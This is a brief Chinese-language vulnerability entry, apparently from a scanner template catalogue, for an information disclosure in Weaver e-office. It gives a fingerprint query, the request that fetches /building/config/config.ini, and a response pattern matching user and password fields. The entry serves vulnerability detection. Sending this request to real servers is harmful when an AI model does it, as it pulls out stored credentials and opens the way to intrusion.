# 泛微eofficeconfig接口信息泄露

泛微OA ｜ 信息泄露 ｜ —
- **指纹**：`app="泛微-EOffice"`
- **请求**：`GET /building/config/config.ini HTTP/1.1`
- **响应特征**：200 ^(?=.*?user)(?=.*?password).*?$